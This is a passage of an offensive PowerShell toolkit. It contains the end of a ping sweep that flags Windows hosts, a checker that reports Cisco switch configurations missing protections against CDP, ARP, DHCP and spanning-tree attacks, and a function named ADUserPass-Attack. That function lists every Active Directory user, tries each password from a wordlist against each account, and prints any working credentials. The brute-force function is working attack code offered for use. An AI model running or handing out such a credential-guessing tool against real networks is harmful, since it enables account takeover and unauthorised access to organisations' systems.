            $ping = ping -n 2 $ip

            if ($ping -match "TTL=128"){
                Write-Host "$ip is your Neighbour" -BackgroundColor Black -ForegroundColor Red
                #Write-Progress -activity "Adding File Sizes" -status "Percent added: " -percentComplete (($ip / $ping.length)  * 100)
            }
            else{}
                
            }

    }

}

function Switch-VulnerabilityAssesment{
<#
    .SYNOPSIS
    This script will tell you, your switch vulnerabilities

    Author: Prince%00
        
    .PARAMETER Config
    Your switch Configuration file. 

    .PARAMETER IP
    IP Address of current switch.

    .EXAMPLE
     Switch-VulnerabilityAssesment -Config C:\Config.txt -IP 192.168.20.10 

    .LINK
     https://github.com/Prince-Amir/Offensive-Powershell.git
#>
    [CmdletBinding()]param (

        [Parameter(Position = 1, Mandatory=$true)]
        $Config,
        
        [Parameter(Position = 2, Mandatory=$true)]
        [string]
        $IP       
        
        )



    $Config = Get-Content $Config

    if ($Config -notcontains 'no cdp'){
        Write-Host "$IP is vulnerable to CDPDoS Attack... " -ForegroundColor Red -BackgroundColor Black
    }


    if ($Config -notcontains 'login block-for'){
        Write-Host "$IP is vulnerable to Bruteforce Attack... " -ForegroundColor Red -BackgroundColor Black
    }



    if ($Config -notcontains 'port-security'){
        Write-Host "$IP is vulnerable to MACof Attack... " -ForegroundColor Red -BackgroundColor Black
    }


    if ($Config -notcontains 'bpduguard'){
        Write-Host "$IP is vulnerable to BPDUDoS Attack... " -ForegroundColor Red -BackgroundColor Black
    }


    if ($Config -notcontains 'snooping'){
        Write-Host "$IP is vulnerable to DHCP Attacks... " -ForegroundColor Red -BackgroundColor Black
    }


    if ($Config -notcontains 'inspection'){
        Write-Host "$IP is vulnerable to Arp-Spoofing Attack... " -ForegroundColor Red -BackgroundColor Black
    }


    if ($Config -notcontains 'spanning-tree guard root'){
        Write-Host "$IP is vulnerable to spanning-tree-root Attack... " -ForegroundColor Red -BackgroundColor Black
    }


}

function ADUserPass-Attack{
<#
    .SYNOPSIS
    This Script is for dictionary Attack in ActiveDirectory for each user by given passwordfile

    Author: Prince%00
        
    .PARAMETER UserFilePath
    palce for saving userfile. 

    .PARAMETER PasswordFilepath
    Your given password file.

    .EXAMPLE
     ADUserPass-Attack -UserFilePath C:\Users.txt -PasswordFilepath C:\Passwords 

    .LINK
     https://github.com/Prince-Amir/Offensive-Powershell.git
#>
    [CmdletBinding()]param (

        [Parameter(Position = 1, Mandatory=$true)]
        $UserFilePath,
        
        [Parameter(Position = 2, Mandatory=$true)]
        [string]
        $PasswordFilepath       
        
        )

 dsquery user -limit 0 > $UserFilePath
foreach ($FDN in  Get-Content $UserFilePath)
{

    $res = dsget user $FDN -samid 
    $samid = $res[1].replace(" ","" )
    echo $samid
    foreach ($passwords in Get-Content $PasswordFilepath)
    {

        $passwords = $passwords.Replace(" ", "")
        	dsget user $FDN -u $samid -p $passwords > $null
        if ($?) {
            Write-Host "Account: $samid Password: $passwords" -BackgroundColor black -ForegroundColor green
        }

    }
}


}

